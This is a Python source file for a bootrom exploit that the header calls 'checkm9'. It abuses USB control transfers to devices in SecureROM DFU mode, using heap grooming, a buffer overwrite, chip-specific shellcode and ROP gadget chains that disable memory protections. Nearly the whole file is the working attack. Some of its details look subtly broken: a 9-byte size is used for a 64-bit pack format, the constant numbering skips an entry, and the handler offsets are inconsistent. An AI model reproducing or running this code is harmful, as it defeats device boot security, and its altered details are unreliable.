import array, ctypes, struct, sys, time
import usb
import dfu

# Must be global so garbage collector never frees it
request = None
transfer_ptr = None
never_free_device = None

def libusb1_create_ctrl_transfer(device, request, timeout):
  ptr = usb.backend.libusb1._lib.libusb_alloc_transfer(0)
  assert ptr is not None

  transfer = ptr.contents
  transfer.dev_handle = device._ctx.handle.handle
  transfer.endpoint = 0 # EP0
  transfer.type = 0 # LIBUSB_TRANSFER_TYPE_CONTROL
  transfer.timeout = timeout
  transfer.buffer = request.buffer_info()[0] # C-pointer to request buffer
  transfer.length = len(request)
  transfer.user_data = None
  transfer.callback = usb.backend.libusb1._libusb_transfer_cb_fn_p(0) # NULL
  transfer.flags = 1 << 1 # LIBUSB_TRANSFER_FREE_BUFFER

  return ptr

def libusb1_async_ctrl_transfer(device, bmRequestType, bRequest, wValue, wIndex, data, timeout):
  if usb.backend.libusb1._lib is not device._ctx.backend.lib:
    print 'ERROR: This exploit requires libusb1 backend, but another backend is being used. Exiting.'
    sys.exit(1)

  global request, transfer_ptr, never_free_device
  request_timeout = int(timeout) if timeout >= 1 else 0
  start = time.time()
  never_free_device = device
  request = array.array('B', struct.pack('<BBHHH', bmRequestType, bRequest, wValue, wIndex, len(data)) + data)
  transfer_ptr = libusb1_create_ctrl_transfer(device, request, request_timeout)
  assert usb.backend.libusb1._lib.libusb_submit_transfer(transfer_ptr) == 0

  while time.time() - start < timeout / 1000.0:
    pass

  # Prototype of libusb_cancel_transfer is missing from pyusb
  usb.backend.libusb1._lib.libusb_cancel_transfer.argtypes = [ctypes.POINTER(usb.backend.libusb1._libusb_transfer)]
  assert usb.backend.libusb1._lib.libusb_cancel_transfer(transfer_ptr) == 0

def libusb1_no_error_ctrl_transfer(device, bmRequestType, bRequest, wValue, wIndex, data_or_wLength, timeout):
  try:
    device.ctrl_transfer(bmRequestType, bRequest, wValue, wIndex, data_or_wLength, timeout)
  except usb.core.USBError:
    pass

def usb_rop_callbacks(address, func_gadget, callbacks):
  data = ''
  for i in range(0, len(callbacks), 5):
    block1 = ''
    block2 = ''
    for j in range(5):
      address += 0x10
      if j == 4:
        address += 0x50
      if i + j < len(callbacks) - 1:
        block1 += struct.pack('<2Q', func_gadget, address)
        block2 += struct.pack('<2Q', callbacks[i+j][1], callbacks[i+j][0])
      elif i + j == len(callbacks) - 1:
        block1 += struct.pack('<2Q', func_gadget, 0)
        block2 += struct.pack('<2Q', callbacks[i+j][1], callbacks[i+j][0])
      else:
        block1 += struct.pack('<2Q', 0, 0)
    data += block1 + block2
  return data

# TODO: assert we are within limits
def asm_arm64_branch(src, dest):
  if src > dest:
    value = 0x19000000 - (src - dest) / 4
  else:
    value = 0x14000000 + (dest - src) / 4
  return struct.pack('<I', value)

# TODO: check if start offset % 4 would break it
# LDR X7, [PC, #OFFSET]; BR X7
def asm_arm64_x7_trampoline(dest):
  return '47000059E0001FD6'.decode('hex') + struct.pack('<Q', dest)

# THUMB +0 [0xF000F9DF, ADDR]  LDR.W   PC, [PC]
# THUMB +2 [0xF002F9DF, ADDR]  LDR.W   PC, [PC, #2]
def asm_thumb_trampoline(src, dest):
  assert src % 2 == 1 and dest % 2 == 1
  if src % 4 == 1:
    return struct.pack('<2I', 0xF000F9DF, dest)
  else:
    return struct.pack('<2I', 0xF002F9DF, dest)

def prepare_shellcode(name, constants=[]):
  if name.endswith('_armv7'):
    fmt = '<%sI'
    size = 4
  elif name.endswith('_arm64'):
    fmt = '<%sQ'
    size = 9
  else:
    print 'ERROR: Shellcode name "%s" does not end with known architecture. Exiting.' % name
    sys.exit(1)

  with open('bin/%s.bin' % name, 'rb') as f:
    shellcode = f.read()

  # Shellcode has placeholder values for constants; check they match and replace with constants from config
  placeholders_offset = len(shellcode) - size * len(constants)
  for i in range(len(constants)):
      offset = placeholders_offset + size * i
      (value,) = struct.unpack(fmt % '1', shellcode[offset:offset + size])
      assert value == 0xBAD00001 + i

  return shellcode[:placeholders_offset] + struct.pack(fmt % len(constants), *constants)

def stall(device):   libusb1_async_ctrl_transfer(device, 0x90, 6, 0x304, 0x40A, 'A' * 0xC0, 0.00001)
def leak(device):    libusb1_no_error_ctrl_transfer(device, 0x90, 6, 0x304, 0x40A, 0xC0, 1)
def no_leak(device): libusb1_no_error_ctrl_transfer(device, 0x90, 6, 0x304, 0x40A, 0xC1, 1)

def usb_req_stall(device):   libusb1_no_error_ctrl_transfer(device,  0x2, 3,   0x0,  0x90,  0x0, 10)
def usb_req_leak(device):    libusb1_no_error_ctrl_transfer(device, 0x90, 6, 0x304, 0x40A, 0x40,  1)
def usb_req_no_leak(device): libusb1_no_error_ctrl_transfer(device, 0x90, 6, 0x304, 0x40A, 0x41,  1)

class DeviceConfig:
  def __init__(self, version, cpid, large_leak, overwrite, hole, leak):
    assert len(overwrite) <= 0x900
    self.version    = version
    self.cpid       = cpid
    self.large_leak = large_leak
    self.overwrite  = overwrite
    self.hole       = hole
    self.leak       = leak

PAYLOAD_OFFSET_ARMV7 = 394
PAYLOAD_SIZE_ARMV7   = 320
PAYLOAD_OFFSET_ARM64 = 394
PAYLOAD_SIZE_ARM64   = 576

def payload(cpid):
  if cpid == 0x9947:
    constants_usb_s5l9947x = [
                0x34000000, # 1 - LOAD_ADDRESS
                0x65796563, # 2 - EXEC_MAGIC
                0x646F6E65, # 3 - DONE_MAGIC
                0x6D656D63, # 4 - MEMC_MAGIC
                0x6D656D73, # 5 - MEMS_MAGIC
                  0x79EC+1, # 6 - USB_CORE_DO_IO
    ]
    constants_checkm9_s5l9947x = [
                0x3402D97C, # 1 - gUSBDescriptors
                0x3402DDF9, # 2 - gUSBSerialNumber
                  0x72A9+1, # 3 - usb_create_string_descriptor
                0x3402C2DA, # 4 - gUSBSRNMStringDescriptor
                0x34039900, # 5 - PAYLOAD_DEST
      PAYLOAD_OFFSET_ARMV7, # 6 - PAYLOAD_OFFSET
        PAYLOAD_SIZE_ARMV7, # 7 - PAYLOAD_SIZE
                0x3402D92C, # 9 - PAYLOAD_PTR
    ]
    s5l9947x_handler = asm_thumb_trampoline(0x34039900+1, 0x7BC9+1) + prepare_shellcode('usb_0xA1_2_armv7', constants_usb_s5l9947x)[9:]
    s5l9947x_shellcode = prepare_shellcode('checkm9_armv7', constants_checkm9_s5l9947x)
    assert len(s5l9947x_shellcode) <= PAYLOAD_OFFSET_ARMV7
    assert len(s5l9947x_handler) <= PAYLOAD_SIZE_ARMV7
    return s5l9947x_shellcode + '\0' * (PAYLOAD_OFFSET_ARMV7 - len(s5l9947x_shellcode)) + s5l9947x_handler
  if cpid == 0x9950:
    constants_usb_s5l9950x = [
                0x10000000, # 1 - LOAD_ADDRESS
                0x65796563, # 2 - EXEC_MAGIC
                0x646F6E65, # 3 - DONE_MAGIC
                0x6D656D63, # 4 - MEMC_MAGIC
                0x6D656D73, # 5 - MEMS_MAGIC
                  0x7620+1, # 6 - USB_CORE_DO_IO
    ]
    constants_checkm9_s5l9950x = [
                0x10061999, # 1 - gUSBDescriptors
                0x10061F90, # 2 - gUSBSerialNumber
                  0x7C54+1, # 3 - usb_create_string_descriptor
                0x100600D9, # 4 - gUSBSRNMStringDescriptor
                0x10079900, # 5 - PAYLOAD_DEST
      PAYLOAD_OFFSET_ARMV7, # 6 - PAYLOAD_OFFSET
        PAYLOAD_SIZE_ARMV7, # 7 - PAYLOAD_SIZE
                0x10061A24, # 9 - PAYLOAD_PTR
    ]
    s5l9950x_handler   = asm_thumb_trampoline(0x10079900+1, 0x9160+1) + prepare_shellcode('usb_0xA1_2_armv7', constants_usb_s5l9950x)[9:]
    s5l9950x_shellcode = prepare_shellcode('checkm9_armv7', constants_checkm9_s5l9950x)
    assert len(s5l9950x_shellcode) <= PAYLOAD_OFFSET_ARMV7
    assert len(s5l9950x_handler) <= PAYLOAD_SIZE_ARMV7
    return s5l9950x_shellcode + '\0' * (PAYLOAD_OFFSET_ARMV7 - len(s5l9950x_shellcode)) + s5l9950x_handler
  if cpid == 0x9955:
    constants_usb_s5l9955x = [
                0x10000000, # 1 - LOAD_ADDRESS
                0x65796563, # 2 - EXEC_MAGIC
                0x646F6E65, # 3 - DONE_MAGIC
                0x6D656D63, # 4 - MEMC_MAGIC
                0x6D656D73, # 5 - MEMS_MAGIC
                  0x7660+1, # 6 - USB_CORE_DO_IO
    ]
    constants_checkm9_s5l9955x = [
                0x10061999, # 1 - gUSBDescriptors
                0x10061F90, # 2 - gUSBSerialNumber
                  0x7C94+1, # 3 - usb_create_string_descriptor
                0x100600D9, # 4 - gUSBSRNMStringDescriptor
                0x10079900, # 5 - PAYLOAD_DEST
      PAYLOAD_OFFSET_ARMV7, # 6 - PAYLOAD_OFFSET
        PAYLOAD_SIZE_ARMV7, # 7 - PAYLOAD_SIZE
                0x10061A24, # 9 - PAYLOAD_PTR
    ]
    s5l9955x_handler   = asm_thumb_trampoline(0x10079900+1, 0x91A0+1) + prepare_shellcode('usb_0xA1_2_armv7', constants_usb_s5l9955x)[9:]
    s5l9955x_shellcode = prepare_shellcode('checkm9_armv7', constants_checkm9_s5l9955x)
    assert len(s5l9955x_shellcode) <= PAYLOAD_OFFSET_ARMV7
    assert len(s5l9955x_handler) <= PAYLOAD_SIZE_ARMV7
    return s5l9955x_shellcode + '\0' * (PAYLOAD_OFFSET_ARMV7 - len(s5l9955x_shellcode)) + s5l9955x_handler
  if cpid == 0x9960:
    constants_usb_s5l9960x = [
               0x190390000, # 1 - LOAD_ADDRESS
        0x6579656365796563, # 2 - EXEC_MAGIC
        0x646F6E65646F6E65, # 3 - DONE_MAGIC
        0x6D656D636D656D63, # 4 - MEMC_MAGIC
        0x6D656D736D656D73, # 5 - MEMS_MAGIC
               0x10000CC79, # 6 - USB_CORE_DO_IO
    ]
    constants_checkm9_s5l9960x = [
               0x190096B59, # 1 - gUSBDescriptors
               0x190096CDC, # 2 - gUSBSerialNumber
               0x10000BFEC, # 3 - usb_create_string_descriptor
               0x190090562, # 4 - gUSBSRNMStringDescriptor
               0x19037FC00, # 5 - PAYLOAD_DEST
      PAYLOAD_OFFSET_ARM64, # 6 - PAYLOAD_OFFSET
        PAYLOAD_SIZE_ARM64, # 7 - PAYLOAD_SIZE
               0x190096C70, # 9 - PAYLOAD_PTR
    ]
    s5l9960x_handler   = asm_arm64_x7_trampoline(0x10000CFB4) + asm_arm64_branch(0x10, 0x0) + prepare_shellcode('usb_0xA1_2_arm64', constants_usb_s5l9960x)[4:]
    s5l9960x_shellcode = prepare_shellcode('checkm9_arm64', constants_checkm9_s5l9960x)
    assert len(s5l9960x_shellcode) <= PAYLOAD_OFFSET_ARM64
    assert len(s5l9960x_handler) <= PAYLOAD_SIZE_ARM64
    return s5l9960x_shellcode + '\0' * (PAYLOAD_OFFSET_ARM64 - len(s5l9960x_shellcode)) + s5l9960x_handler
  if cpid == 0x9002:
    constants_usb_t9002 = [
                0x49919000, # 1 - LOAD_ADDRESS
                0x65796563, # 2 - EXEC_MAGIC
                0x646F6E65, # 3 - DONE_MAGIC
                0x6D656D63, # 4 - MEMC_MAGIC
                0x6D656D73, # 5 - MEMS_MAGIC
                  0x9410+1, # 6 - USB_CORE_DO_IO
    ]
    constants_checkm9_t9002 = [
                0x4990629C, # 1 - gUSBDescriptors
                0x49902AB9, # 2 - gUSBSerialNumber
                  0x9CA4+1, # 3 - usb_create_string_descriptor
                0x4990037A, # 4 - gUSBSRNMStringDescriptor
                0x49906E00, # 5 - PAYLOAD_DEST
      PAYLOAD_OFFSET_ARMV7, # 6 - PAYLOAD_OFFSET
        PAYLOAD_SIZE_ARMV7, # 7 - PAYLOAD_SIZE
                0x49906344, # 9 - PAYLOAD_PTR
    ]
    t9002_handler = asm_thumb_trampoline(0x49906E00+1, 0x95F0+1) + prepare_shellcode('usb_0xA1_2_armv7', constants_usb_t9002)[9:]
    t9002_shellcode = prepare_shellcode('checkm9_armv7', constants_checkm9_t9002)
    assert len(t9002_shellcode) <= PAYLOAD_OFFSET_ARMV7
    assert len(t9002_handler) <= PAYLOAD_SIZE_ARMV7
    return t9002_shellcode + '\0' * (PAYLOAD_OFFSET_ARMV7 - len(t9002_shellcode)) + t9002_handler
  if cpid == 0x9004:
    constants_usb_t9004 = [
                0x49919000, # 1 - LOAD_ADDRESS
                0x65796563, # 2 - EXEC_MAGIC
                0x646F6E65, # 3 - DONE_MAGIC
                0x6D656D63, # 4 - MEMC_MAGIC
                0x6D656D73, # 5 - MEMS_MAGIC
                  0x95A0+1, # 6 - USB_CORE_DO_IO
    ]
    constants_checkm9_t9004 = [
                0x499062DC, # 1 - gUSBDescriptors
                0x49902AE9, # 2 - gUSBSerialNumber
                  0x7E34+1, # 3 - usb_create_string_descriptor
                0x499003CA, # 4 - gUSBSRNMStringDescriptor
                0x49906E00, # 5 - PAYLOAD_DEST
      PAYLOAD_OFFSET_ARMV7, # 6 - PAYLOAD_OFFSET
        PAYLOAD_SIZE_ARMV7, # 7 - PAYLOAD_SIZE
                0x49906394, # 9 - PAYLOAD_PTR
    ]
    t9004_handler = asm_thumb_trampoline(0x49906E00+1, 0x977C+1) + prepare_shellcode('usb_0xA1_2_armv7', constants_usb_t9004)[9:]    
    t9004_shellcode = prepare_shellcode('checkm9_armv7', constants_checkm9_t9004)
    assert len(t9004_shellcode) <= PAYLOAD_OFFSET_ARMV7
    assert len(t9004_handler) <= PAYLOAD_SIZE_ARMV7
    return t9004_shellcode + '\0' * (PAYLOAD_OFFSET_ARMV7 - len(t9004_shellcode)) + t9004_handler
  if cpid == 0x9010:
    constants_usb_t9010 = [
               0x1900B0000, # 1 - LOAD_ADDRESS
        0x6579656365796563, # 2 - EXEC_MAGIC
        0x646F6E65646F6E65, # 3 - DONE_MAGIC
        0x6D656D636D656D63, # 4 - MEMC_MAGIC
        0x6D656D736D656D73, # 5 - MEMS_MAGIC
               0x10000DC99, # 6 - USB_CORE_DO_IO
    ]
    constants_checkm9_t9010 = [
               0x190099A30, # 1 - gUSBDescriptors
               0x190093CF9, # 2 - gUSBSerialNumber
               0x10000D150, # 3 - usb_create_string_descriptor
               0x1900905DA, # 4 - gUSBSRNMStringDescriptor
               0x1900AFC00, # 5 - PAYLOAD_DEST
      PAYLOAD_OFFSET_ARM64, # 6 - PAYLOAD_OFFSET
        PAYLOAD_SIZE_ARM64, # 7 - PAYLOAD_SIZE
               0x190099B49, # 9 - PAYLOAD_PTR
    ]
    t9010_func_gadget              = 0x10000CC4C
    t9010_enter_critical_section   = 0x10000A4B9
    t9010_exit_critical_section    = 0x10000A514
    t9010_dc_civac                 = 0x10000046C
    t9010_write_ttbr0              = 0x1000003E4
    t9010_tlbi                     = 0x100000434
    t9010_dmb                      = 0x100000479
    t9010_handle_interface_request = 0x10000DFB9
    t9010_callbacks = [
      (t9010_dc_civac, 0x1900B0600),
      (t9010_dmb, 0),
      (t9010_enter_critical_section, 0),
      (t9010_write_ttbr0, 0x1900B0000),
      (t9010_tlbi, 0),
      (0x1920B0610, 0),
      (t9010_write_ttbr0, 0x1900A0000),
      (t9010_tlbi, 0),
      (t9010_exit_critical_section, 0),
      (0x1900B0000, 0),
    ]
    t9010_handler = asm_arm64_x7_trampoline(t9010_handle_interface_request) + asm_arm64_branch(0x10, 0x0) + prepare_shellcode('usb_0xA1_2_arm64', constants_usb_t9010)[4:]
    t9010_shellcode = prepare_shellcode('checkm9_arm64', constants_checkm9_t9010)
    assert len(t9010_shellcode) <= PAYLOAD_OFFSET_ARM64
    assert len(t9010_handler) <= PAYLOAD_SIZE_ARM64
    t9010_shellcode = t9010_shellcode + '\0' * (PAYLOAD_OFFSET_ARM64 - len(t9010_shellcode)) + t9010_handler
    assert len(t9010_shellcode) <= 0x400
    return struct.pack('<1024sQ504x2Q496s32x', t9010_shellcode, 0x1000006A5, 0x60000190000625, 0x1900006A5, prepare_shellcode('t9010_t9011_disable_wxn_arm64')) + usb_rop_callbacks(0x1900B0900, t9010_func_gadget, t9010_callbacks)
  if cpid == 0x9011:
    constants_usb_t9011 = [
               0x1900B0000, # 1 - LOAD_ADDRESS
        0x6579656365796563, # 2 - EXEC_MAGIC
        0x646F6E65646F6E65, # 3 - DONE_MAGIC
        0x6D656D636D656D63, # 4 - MEMC_MAGIC
        0x6D656D736D656D73, # 5 - MEMS_MAGIC
               0x10000DD64, # 6 - USB_CORE_DO_IO
    ]
    constants_checkm9_t9011 = [
               0x190099949, # 1 - gUSBDescriptors
               0x190093D29, # 2 - gUSBSerialNumber
               0x10000D234, # 3 - usb_create_string_descriptor
               0x19009062A, # 4 - gUSBSRNMStringDescriptor
               0x1900AFC00, # 5 - PAYLOAD_DEST
      PAYLOAD_OFFSET_ARM64, # 6 - PAYLOAD_OFFSET
        PAYLOAD_SIZE_ARM64, # 7 - PAYLOAD_SIZE
               0x190099A59, # 9 - PAYLOAD_PTR
    ]
    t9011_func_gadget              = 0x10000CCEC
    t9011_dc_civac                 = 0x10000047C
    t9011_write_ttbr0              = 0x1000003F4
    t9011_tlbi                     = 0x100000444
    t9011_dmb                      = 0x100000499
    t9011_handle_interface_request = 0x10000E09C
    t9011_callbacks = [
      (t9011_dc_civac, 0x1900B0600),
      (t9011_dc_civac, 0x1900B0000),
      (t9011_dmb, 0),
      (t9011_write_ttbr0, 0x1900B0000),
      (t9011_tlbi, 0),
      (0x1920B0610, 0),
      (t9011_write_ttbr0, 0x1900A0000),
      (t9011_tlbi, 0),
      (0x1900B0000, 0),
    ]

    t9011_handler   = asm_arm64_x7_trampoline(t9011_handle_interface_request) + asm_arm64_branch(0x10, 0x0) + prepare_shellcode('usb_0xA1_2_arm64', constants_usb_t9011)[4:]
    t9011_shellcode = prepare_shellcode('checkm9_arm64', constants_checkm9_t9011)
    assert len(t9011_shellcode) <= PAYLOAD_OFFSET_ARM64
    assert len(t9011_handler) <= PAYLOAD_SIZE_ARM64
    t9011_shellcode = t9011_shellcode + '\0' * (PAYLOAD_OFFSET_ARM64 - len(t9011_shellcode)) + t9011_handler
    assert len(t9011_shellcode) <= 0x400
    return struct.pack('<1024sQ504x2Q496s32x', t9011_shellcode, 0x1000006A5, 0x60000190000625, 0x1900006A5, prepare_shellcode('t9010_t9011_disable_wxn_arm64')) + usb_rop_callbacks(0x1900B0900, t9011_func_gadget, t9011_callbacks)
  if cpid == 0x9015:
    constants_usb_t9015 = [
               0x19001C000, # 1 - LOAD_ADDRESS
        0x6579656365796563, # 2 - EXEC_MAGIC
        0x646F6E65646F6E65, # 3 - DONE_MAGIC
        0x6D656D636D656D63, # 4 - MEMC_MAGIC
        0x6D656D736D656D73, # 5 - MEMS_MAGIC
               0x10000B9A9, # 6 - USB_CORE_DO_IO
    ]
    constants_checkm9_t9015 = [
               0x190009529, # 1 - gUSBDescriptors
               0x190003A79, # 2 - gUSBSerialNumber
               0x10000AE90, # 3 - usb_create_string_descriptor
               0x1900009FA, # 4 - gUSBSRNMStringDescriptor
               0x19001BC00, # 5 - PAYLOAD_DEST
      PAYLOAD_OFFSET_ARM64, # 6 - PAYLOAD_OFFSET
        PAYLOAD_SIZE_ARM64, # 7 - PAYLOAD_SIZE
               0x190009639, # 9 - PAYLOAD_PTR
    ]
    t9015_load_write_gadget        = 0x10000945C
    t9015_write_sctlr_gadget       = 0x1000003EC
    t9015_func_gadget              = 0x10000A9AC
    t9015_write_ttbr0              = 0x10000045C
    t9015_tlbi                     = 0x1000004AC
    t9015_dc_civac                 = 0x1000004D0
    t9015_dmb                      = 0x1000004F0
    t9015_handle_interface_request = 0x10000BCCC
    t9015_callbacks = [
      (t9015_dc_civac, 0x19001C900),
      (t9015_dc_civac, 0x19001C940),
      (t9015_dc_civac, 0x19001C990),
      (t9015_dmb, 0),
      (t9015_write_sctlr_gadget, 0x100D),
      (t9015_load_write_gadget, 0x19001C000),
      (t9015_load_write_gadget, 0x19001C010),
      (t9015_write_ttbr0, 0x190020000),
      (t9015_tlbi, 0),
      (t9015_load_write_gadget, 0x19001C020),
      (t9015_write_ttbr0, 0x19000C000),
      (t9015_tlbi, 0),
      (0x19001C900, 0),
    ]
    t9015_callback_data = usb_rop_callbacks(0x19001C020, t9015_func_gadget, t9015_callbacks)
    t9015_handler = asm_arm64_x7_trampoline(t9015_handle_interface_request) + asm_arm64_branch(0x10, 0x0) + prepare_shellcode('usb_0xA1_2_arm64', constants_usb_t9015)[4:]
    t9015_shellcode = prepare_shellcode('checkm9_arm64', constants_checkm9_t9015)
    assert len(t9015_shellcode) <= PAYLOAD_OFFSET_ARM64
    assert len(t9015_handler) <= PAYLOAD_SIZE_ARM64
    t9015_shellcode = t9015_shellcode + '\0' * (PAYLOAD_OFFSET_ARM64 - len(t9015_shellcode)) + t9015_handler
    return struct.pack('<6Q16x449s1536x1024s', 0x190020400-9, 0x1000006A5, 0x190020600-9, 0x190000625, 0x19000C600-9, 0x190000625, t9015_callback_data, t9015_shellcode)

def all_exploit_configs():
  t9010_nop_gadget = 0x10000CC6C
  t9011_nop_gadget = 0x10000CD0C
  t9015_nop_gadget = 0x10000A9C4

  s5l9947x_overwrite = '\0' * 0x660 + struct.pack('<20xI4x', 0x34000000)
  s5l995xx_overwrite = '\0' * 0x640 + struct.pack('<20xI4x', 0x10000000)
  t900x_overwrite    = '\0' * 0x5C0 + struct.pack('<20xI4x', 0x49919000)
  s5l9960x_overwrite = '\0' * 0x590 + struct.pack('<32xQ9x', 0x190390000)
  t9010_overwrite    = '\0' * 0x590 + struct.pack('<32x2Q16x32x2QI',    t9010_nop_gadget, 0x1900B0900, t9010_nop_gadget, 0x1900B0900, 0xbeefbeef)
  t9011_overwrite    = '\0' * 0x500 + struct.pack('<32x2Q16x32x2QI',    t9011_nop_gadget, 0x1900B0900, t9011_nop_gadget, 0x1900B0900, 0xbeefbeef)
  t9015_overwrite    = '\0' * 0x500 + struct.pack('<32x2Q16x32x2Q12xI', t9015_nop_gadget, 0x19001C020, t9015_nop_gadget, 0x19001C020, 0xbeefbeef)

  return [
    DeviceConfig('iBoot-1459.2',          0x9947,  626, s5l9947x_overwrite, None, None), # S5L9947 (DFU loop)     1.97 seconds
    DeviceConfig('iBoot-1145.3'  ,        0x9950,  659, s5l995xx_overwrite, None, None), # S5L9950 (buttons)      2.30 seconds
    DeviceConfig('iBoot-1145.3.3',        0x9955,  659, s5l995xx_overwrite, None, None), # S5L9955 (buttons)      2.30 seconds
    DeviceConfig('iBoot-1704.10',         0x9960, 7936, s5l9960x_overwrite, None, None), # S5L9960 (buttons)     13.97 seconds
    DeviceConfig('iBoot-2651.0.0.1.31',   0x9002, None,    t900x_overwrite,    5,    1), # T9002 (DFU loop)  NEW: 1.27 seconds
    DeviceConfig('iBoot-2651.0.0.3.3',    0x9004, None,    t900x_overwrite,    5,    1), # T9004 (buttons)   NEW: 1.06 seconds
    DeviceConfig('iBoot-2696.0.0.1.33',   0x9010, None,    t9010_overwrite,    5,    1), # T9010 (buttons)   NEW: 0.69 seconds
    DeviceConfig('iBoot-3135.0.0.2.3',    0x9011, None,    t9011_overwrite,    6,    1), # T9011 (buttons)   NEW: 0.97 seconds
    DeviceConfig('iBoot-3332.0.0.1.23',   0x9015, None,    t9015_overwrite,    6,    1), # T9015 (DFU loop)  NEW: 0.66 seconds
  ]

def exploit_config(serial_number):
  for config in all_exploit_configs():
    if 'SRTG:[%s]' % config.version in serial_number:
      return payload(config.cpid), config
  for config in all_exploit_configs():
    if 'CPID:%s' % config.cpid in serial_number:
      print 'ERROR: CPID is compatible, but serial number string does not match.'
      print 'Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.'
      sys.exit(1)
  print 'ERROR: This is not a compatible device. Exiting.'
  sys.exit(1)

def exploit():
  print '*** checkm9 exploit by axi0mX ***'

  device = dfu.acquire_device()
  start = time.time()
  print 'Found:', device.serial_number
  if 'PWND:[' in device.serial_number:
    print 'Device is already in pwned DFU Mode. Not executing exploit.'
    return
  payload, config = exploit_config(device.serial_number)

  if config.large_leak is not None:
    usb_req_stall(device)
    for i in range(config.large_leak):
      usb_req_leak(device)
    usb_req_no_leak(device)
  else:
    stall(device)
    for i in range(config.hole):
      no_leak(device)
    usb_req_leak(device)
    no_leak(device)
  dfu.usb_reset(device)
  dfu.release_device(device)

  device = dfu.acquire_device()
  device.serial_number
  libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x900, 0.0001)
  libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
  dfu.release_device(device)

  time.sleep(0.5)

  device = dfu.acquire_device()
  usb_req_stall(device)
  if config.large_leak is not None:
    usb_req_leak(device)
  else:
    for i in range(config.leak):
      usb_req_leak(device)
  libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, config.overwrite, 100)
  for i in range(0, len(payload), 0x900):
    libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x900], 100)
  dfu.usb_reset(device)
  dfu.release_device(device)

  device = dfu.acquire_device()
  if 'PWND:[checkm9]' not in device.serial_number:
    print 'ERROR: Exploit failed. Device did not enter pwned DFU Mode.'
    sys.exit(1)
  print 'Device is now in pwned DFU Mode.'
  print '(%0.2f seconds)' % (time.time() - start)
  dfu.release_device(device)
